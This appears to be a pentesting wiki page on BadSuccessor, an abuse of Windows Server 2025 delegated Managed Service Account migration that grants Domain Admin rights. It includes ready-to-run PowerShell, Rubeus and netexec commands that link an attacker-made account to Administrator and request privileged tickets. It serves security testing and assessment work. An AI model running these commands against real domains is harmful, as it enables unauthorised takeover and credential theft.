# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** abuses the **delegated Managed Service Account** (**dMSA**) migration workflow introduced in **Windows Server 2025**. A dMSA can be linked to a legacy account through **`msDS-ManagedAccountPrecededByLink`** and moved through the migration states stored in **`msDS-DelegatedMSAState`**. If an attacker can create a dMSA in a writable OU and control those attributes, the KDC can issue tickets for the attacker-controlled dMSA with the **authorization context of the linked account**.

In practice this means a low-privileged user who only has delegated OU rights can create a new dMSA, point it at `Administrator`, complete the migration state, and then obtain a TGT whose PAC contains privileged groups such as **Domain Admins**.

## dMSA migration details that matter

- dMSA is a **Windows Server 2025** feature.
- `Start-ADServiceAccountMigration` sets the migration into the **started** state.
- `Complete-ADServiceAccountMigration` sets the migration into the **completed** state.
- `msDS-DelegatedMSAState = 1` means migration started.
- `msDS-DelegatedMSAState = 2` means migration completed.
- During legitimate migration, the dMSA is meant to replace the superseded account transparently, so the KDC/LSA preserve access that the previous account already had.

Microsoft Learn also notes that during migration the original account is tied to the dMSA and the dMSA is intended to access what the old account could access. This is the security assumption BadSuccessor abuses.

## Requirements

1. A domain where **dMSA exists**, which means **Windows Server 2025** support is present on the AD side.
2. The attacker can **create** `msDS-DelegatedManagedServiceAccount` objects in some OU, or has equivalent broad child-object creation rights there.
3. The attacker can **write** the relevant dMSA attributes or fully control the dMSA they just created.
4. The attacker can request Kerberos tickets from a domain-joined context or from a tunnel that reaches LDAP/Kerberos.

### Practical checks

The cleanest operator signal is to verify the domain/forest level and confirm the environment is already using the new Server 2025 stack:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

If you see values such as `Windows2025Domain` and `Windows2025Forest`, treat **BadSuccessor / dMSA migration abuse** as a priority check.

You can also enumerate writable OUs delegated for dMSA creation with public tooling:

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Abuse flow

1. Create a dMSA in an OU where you have delegated create-child rights.
2. Set **`msDS-ManagedAccountPrecededByLink`** to the DN of a privileged target such as `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Set **`msDS-DelegatedMSAState`** to `2` to mark the migration as completed.
4. Request a TGT for the new dMSA and use the returned ticket to access privileged services.

PowerShell example:

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ticket request / operational tooling examples:

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Why this is more than privilege escalation

During legitimate migration, Windows also needs the new dMSA to handle tickets that were issued for the previous account before cutover. This is why dMSA-related ticket material can include **current** and **previous** keys in the **`KERB-DMSA-KEY-PACKAGE`** flow.

For an attacker-controlled fake migration, that behavior can turn BadSuccessor into:

- **Privilege escalation** by inheriting privileged group SIDs in the PAC.
- **Credential material exposure** because previous-key handling can expose material equivalent to the predecessor's RC4/NT hash in vulnerable workflows.

That makes the technique useful both for direct domain takeover and for follow-on operations such as pass-the-hash or wider credential compromise.

## Notes on patch status

The original BadSuccessor behavior is **not just a theoretical 2025 preview issue**. Microsoft assigned it **CVE-2025-53779** and published a security update in **August 2025**. Keep this attack documented for:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **validation of OU delegations and dMSA exposure during assessments**

Do not assume a Windows Server 2025 domain is vulnerable just because dMSA exists; verify patch level and test carefully.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
